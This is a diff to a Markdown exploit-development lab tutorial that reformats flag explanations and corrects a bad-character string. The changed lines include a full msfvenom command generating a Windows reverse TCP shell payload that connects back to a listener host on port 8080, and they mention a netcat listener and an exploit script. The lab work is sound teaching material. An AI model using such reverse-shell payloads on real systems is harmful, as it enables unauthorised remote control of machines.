@@ -894,7 +894,8 @@ With this exploit we will use the well known [msfvenom](https://docs.metasploit.
 			* Set the `LHOST` option to the IP of your remote host
 		* `-a x86`: Specify the target architecture as `x86`
 		* `--platform windows`: Specify the target platform as Windows
-		* `-f python`: Format the output for use in a python script
+		* `-f`: The output format. 
+        	* `python`: Format for use in python scripts.
 		* `-b ...`: Specify the bad chars.
 
 		<img src="Images/I54.png" width=600>
@@ -1107,7 +1108,7 @@ We will perform a similar exploit to one done for the [KSTET_Multi](https://gith
 4.  Generate the second stage reverse shell code using ```msfvenom``` program, and create a exploit as shown in [exploit12c-MULT.py](./SourceCode/exploit12c-MULT.py). 
 	<!-- Look into ADD -a x86 and --platform windows -->
 	```
-	$ msfvenom  -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=8080 EXITFUNC=thread -f python -v SHELL -b '\x00x\0a\x0d'
+	$ msfvenom  -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=8080 EXITFUNC=thread -f python -v SHELL -b '\x00\x0a\x0d'
 	```
 	* `-p `: Payload we are generating shellcode for.
     	* `windows/shell_reverse_tcp`: Reverse TCP payload for Windows.
@@ -1119,7 +1120,7 @@ We will perform a similar exploit to one done for the [KSTET_Multi](https://gith
   	* `-v`: Specify a custom variable name.
     	* `SHELL`: Shell Variable name.
   	* `-b`: Specifies bad chars and byte values. This is given in the byte values. 
-      	* `\x00x\0a\x0d`: Null char, carriage return, and newline. 
+      	* `\x00\x0a\x0d`: Null char, carriage return, and newline. 
 
 *Note*: Be sure to run the [netcat](https://linux.die.net/man/1/nc) listener on our Kali machine for port 8080 while running [exploit12c-MULT.py](./SourceCode/exploit6.py)
 
